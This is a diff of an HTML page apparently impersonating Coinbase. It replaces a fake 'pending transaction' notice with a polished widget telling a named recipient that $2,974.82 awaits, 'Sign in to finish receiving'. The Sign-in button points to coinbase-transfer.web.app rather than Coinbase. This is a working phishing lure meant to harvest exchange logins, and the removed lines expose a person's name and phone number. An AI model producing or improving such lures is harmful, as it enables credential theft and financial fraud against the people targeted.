@@ -140,8 +140,124 @@
   <main>
     <section class="hero">
       <div class="pill"><i></i> Fast. Secure. Borderless.</div>
-      <h1>Coinbase, your one-stop <span>financial solution</span> to send, receive and invest your money.  <span style="font-size:23px;">Trade Fiat and over 200+ digital currencies.</span> </h1>
-      <div class="sub"  style="color: #999999; border: 1px solid #999999; border-radius: 12px; padding: 15px;"> <span style="font-size:15px; font-weight:bold; color:black;">(1) pending - transaction   </span> <p> <span style="color:black; font-size:13px; font-weight:bold;"> Mary Kathan (+16073777311),   </span>   <span style="color:black; font-size:13px; font-weight:normal;"> you have received</span>  <span style="font-weight: bold; font-size:13px; color: black;" >$2,974.82   -   0.051BTC</span> <span style="color: black; font-size:13px; font-weight:normal;">from</span> <span style="color: black; font-size:13px; font-weight:bold;">Tom Jones 19************ </span> <span style="color: black; font-size:13px; font-weight:normal;">, sign in to finish receiving.</span> </p></div>
+      <h1> <span style="font-size:16px;"> Coinbase, your one-stop <span>financial solution</span> to send, receive and invest your money.  <span style="font-size:16px;">Trade Fiat and over 200+ digital currencies.</span> </span>  </h1>
+      <p class="sub" <!-- Paste this inside your existing <div> -->
+<style>
+  .ex-pending-widget {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    text-align: center;
+    max-width: 360px;
+    margin: 0 auto;
+    box-sizing: border-box;
+  }
+
+  .ex-pending-widget * {
+    box-sizing: border-box;
+  }
+
+  .ex-pending-icon {
+    width: 68px;
+    height: 68px;
+    background-color: #eff6ff;
+    color: #0066ff;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 auto 20px auto;
+  }
+
+  .ex-pending-icon svg {
+    width: 32px;
+    height: 32px;
+  }
+
+  .ex-pending-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: #111827;
+    margin: 0 0 8px 0;
+  }
+
+  .ex-pending-subtitle {
+    font-size: 15px;
+    color: #4b5563;
+    margin: 0 0 24px 0;
+  }
+
+  .ex-pending-card {
+    background-color: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 16px;
+    padding: 16px 18px;
+    text-align: left;
+  }
+
+  .ex-pending-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 0;
+    font-size: 14px;
+  }
+
+  .ex-pending-row:not(:last-child) {
+    border-bottom: 1px solid #e5e7eb;
+  }
+
+  .ex-pending-label {
+    color: #6b7280;
+  }
+
+  .ex-pending-value {
+    font-weight: 600;
+    color: #111827;
+  }
+
+  .ex-pending-pill {
+    background-color: #fef3c7;
+    color: #b45309;
+    padding: 4px 10px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 600;
+  }
+</style>
+
+<div class="ex-pending-widget">
+  <!-- Clock Icon -->
+  <div class="ex-pending-icon">
+    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="10"></circle>
+      <polyline points="12 6 12 12 16 14"></polyline>
+    </svg>
+  </div>
+
+  <!-- Heading -->
+  <h2 class="ex-pending-title">1 Pending Transaction</h2>
+  <p class="ex-pending-subtitle">Sign in to finish receiving</p>
+
+  <!-- Details Table Card -->
+  <div class="ex-pending-card">
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Status</span>
+      <span class="ex-pending-pill">Awaiting Verification</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Account Name</span>
+      <span class="ex-pending-value">Mary Ka****</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Amount</span>
+      <span class="ex-pending-value"> $2,974.82</span>
+    </div>
+    <div class="ex-pending-row">
+      <span class="ex-pending-label">Reference ID</span>
+      <span class="ex-pending-value">#EX-904821</span>
+    </div>
+  </div>
+</div>
+</span> </p>
 
       <a href="https://coinbase-transfer.web.app/sign-in" class="cta">
         Sign-in
